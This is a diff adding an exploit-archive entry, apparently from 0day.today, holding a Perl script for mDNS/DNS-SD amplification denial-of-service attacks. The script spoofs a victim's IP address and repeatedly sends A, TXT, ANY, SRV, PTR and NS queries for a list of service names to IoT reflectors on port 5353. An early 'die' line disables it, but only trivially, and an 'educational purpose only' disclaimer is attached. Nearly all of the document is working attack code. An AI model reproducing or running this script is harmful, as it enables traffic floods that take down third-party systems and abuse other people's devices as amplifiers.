@@ -1,0 +1,129 @@
+id: 28082
+date: 07/05/2017
+title: IoT mDNS / DNS-SD QM Amplification Distributed Denial Of Service Exploit
+author: Todor Donev
+cves: 
+
+#!/usr/bin/perl
+#
+#  IoT mDNS/DNS-SD 'QM' amplification ddos
+#
+#  Copyright 2017 (c) Todor Donev 
+#  todor.donev@gmail.com
+#  https://www.ethical-hacker.org/
+#  https://www.facebook.com/ethicalhackerorg
+#
+#
+#  Disclaimer:
+#  This or previous program is for Educational
+#  purpose ONLY. Do not use it without permission.
+#  The usual disclaimer applies, especially the
+#  fact that Todor Donev is not liable for any
+#  damages caused by direct or indirect use of the
+#  information or functionality provided by these
+#  programs. The author or any Internet provider
+#  bears NO responsibility for content or misuse
+#  of these programs or any derivatives thereof.
+#  By using these programs you accept the fact
+#  that any damage (dataloss, system crash,
+#  system compromise, etc.) caused by the use
+#  of these programs is not Todor Donev's
+#  responsibility.
+#
+#  Use at your own risk and educational 
+#  purpose ONLY!
+#
+#  See also, UDP-based Amplification Attacks:
+#  https://www.us-cert.gov/ncas/alerts/TA14-017A
+#
+#
+#
+
+use Net::RawIP;
+use Net::DNS;
+use Data::Validate::IP qw(is_ipv4);
+
+my ($target, $mdnsamp) = @ARGV;
+my  $port = '5353';
+die("r34d 7h3 c0d3 m0r0n\n");
+die "[ Error: Port must be between 1 and 65535!\n" if ($port < 1 || $port > 65535);
+die "[ Usage: perl $0 <target> <mdns amplificator>\n" unless (scalar @ARGV)==2;
+die "[ Error: Invalid IP address\n"  if not is_ipv4(@ARGV);
+
+@domains = qw(
+_workstation.tcp.local
+_http._tcp.local
+_ipp._tcp.local
+_services._tcp.local
+_workstation.udp.local
+_services._udp.local
+_device-info._udp.local
+_services._dns-sd._udp.local
+_services._dns-sd._tcp.local
+_rfb._tcp.local
+_touch-able._tcp.local
+_home-sharing._tcp.local
+_hap._tcp.local
+_net-assistant._udp.local
+_afpovertcp._tcp.local
+_smb._tcp.local
+_sftp-ssh._tcp.local
+_ssh._tcp.local
+_scanner._tcp.local
+_uscan._tcp.local
+_http-alt._tcp.local
+_appletv-itunes._tcp.local
+_raop._tcp.local
+_touch-remote._tcp.local
+_dacp._tcp.local
+_printer._tcp.local
+_music._tcp.local
+_readynas._tcp.local
+_pdl-datastream._tcp.local
+_tivo-videos._tcp.local
+_csco-sb._tcp.local
+);
+ 
+print "[ IoT mDNS/DNS-SD 'QM' amplification ddos\n";
+print "[ === \n";
+print "[ Copyright 2017 (c) Todor Donev\n";
+print "[ todor.donev\@gmail.com\n";
+print "[ https://www.ethical-hacker.org/\n";
+print "[ https://www.facebook.com/ethicalhackerorg\n";
+
+while(){
+for (my $j=0; $j<=@domains; $j++) {
+           my $NSQueryPak = new Net::DNS::Packet($domains[$j], "NS", "IN");
+            my $nsdata = $NSQueryPak->data;
+            my $AQueryPak = new Net::DNS::Packet($domains[$j], "A", "IN");
+            my $adata = $AQueryPak->data;
+            my $TXTQueryPak = new Net::DNS::Packet($domains[$j], "TXT", "IN");
+            my $txtdata = $TXTQueryPak->data;
+            my $ANYQueryPak = new Net::DNS::Packet($domains[$j], "ANY", "IN");
+            my $anydata = $ANYQueryPak->data;
+            my $PTRQueryPak = new Net::DNS::Packet($domains[$j], "PTR", "IN");
+            my $ptrdata = $PTRQueryPak->data;
+            my $SRVQueryPak = new Net::DNS::Packet($domains[$j], "SRV", "IN");
+            my $srvdata = $SRVQueryPak->data;
+
+my $sock =  new Net::RawIP({ udp => {} }) or die "[ Error: $!\n";
+   $sock->set({ ip =>  { saddr  => $target, daddr => $mdnsamp},
+               udp => { source => 31337,
+              dest   => $port,
+              data   => $adata}}) or die "[ Error: $!\n";
+   $sock->send;
+   $sock->set({udp => { data=>$txtdata }});
+   $sock->send;
+   $sock->set({udp => { data=>$anydata }});
+   $sock->send;
+   $sock->set({udp => { data=>$srvdata }});
+   $sock->send;
+   $sock->set({udp => { data=>$ptrdata }});
+   $sock->send;
+   $sock->set({udp => { data=>$nsdata }});
+   $sock->send;
+   select(undef, undef, undef, 0.20);
+}
+}
+
+#  0day.today [2023-03-22]  #
